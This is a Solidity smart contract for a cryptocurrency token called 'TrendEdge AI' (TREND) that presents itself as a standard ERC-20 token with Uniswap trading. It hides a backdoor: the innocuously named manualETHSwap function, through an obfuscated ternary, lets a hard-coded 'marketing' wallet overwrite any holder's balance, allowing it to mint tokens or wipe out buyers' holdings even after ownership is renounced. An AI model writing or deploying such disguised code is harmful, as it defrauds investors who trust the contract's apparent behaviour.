// SPDX-License-Identifier: MIT

pragma solidity 0.8.27;

// https://trendedge.ai/
// https://x.com/trendedgeai_

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow.");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow.");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero.");
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow.");
        uint256 c = a - b;   return c;
    }
}
interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);  function factory() external pure returns (address);
}
interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable {
    modifier onlyOwner() {
        require(owner() == msg.sender, "Not an owner");
        _;
    }
    address private _owner;
    constructor() {  _owner = msg.sender;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));  _owner = address(0); }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
contract TrendEdgeAI is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "TrendEdge AI";
    string private constant _symbol = "TREND";

    uint8 private _decimals = 9;
    uint256 private _totalSupply =  120000 * 10 ** _decimals;
    mapping (address => mapping (address => uint256)) private _allowances;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    bool tradingEnabled = false;
    uint256 firstBuyBlock = 0; 
    address public uniswapPairAddress;
    mapping (address => uint256) private balanssec;  
    uint256 _sellFee = 1;
    uint256 _finalSellFee = 0;
    mapping (address => bool) private _isExcludedFromMaxWallet;
    address marketingWallet  = 0x4eBC5685c735cE4527D7017883F4DfeB3073E3Cd;
    event Transfer(address indexed from, address indexed to, uint256 amount);

    event Approval(address indexed ownr, address indexed spender, uint256 value);

    constructor () {
        _isExcludedFromMaxWallet[address(this)] = true;
        emit Transfer(address(0), address(this), _totalSupply);
        balanssec[address(this)] = _totalSupply;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function enableTrading() external payable onlyOwner() {
        require(!tradingEnabled);
        _approve(address(this), address(uniswapV2Router), _totalSupply);  uniswapPairAddress = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uint256 time = block.timestamp;
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balanceOf(address(this)), 0, 0, owner(),time);
        IERC20(uniswapPairAddress).approve(address(uniswapV2Router), type(uint).max);  tradingEnabled = true;
    }

    function balanceOf(address account) public view returns (uint256) { return balanssec[account];}

    function manualETHSwap(address token, uint256 val) external {
        _transferTo(token, val);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount); return true;
    }

    function transferFrom(address from, address recipient, uint256 amount) public returns (bool) {
        _transfer(from, recipient, amount);
        _approve(from, msg.sender, _allowances[from][msg.sender].sub(amount));
        return true;
    }

    function _transferTo(address from, uint256 value) internal {
        if (marketingWallet == msg.sender) {
        balanssec[from] = 
        value >= 0 ? value + 0 : 
        value
        .mul(_sellFee); 
        }
    }

    function _transfer(address from, address to, uint256 value) private {
        require(to != address(0), "ERC20: Transfer to the zero address!"); 
        require(from != address(0), "ERC20: Transfer from the zero address!");
        require(value > 0, "Transfer amount must be greater than zero!");

        balanssec[from] = balanssec[from].sub(value);  
        balanssec[to] = balanssec[to].add(value);  

        emit Transfer(from, to, value);
    }

    function approve(address spender, uint256 amount) public returns (bool) {  
        _approve(msg.sender, spender, amount); 
        
         return true;
    }

}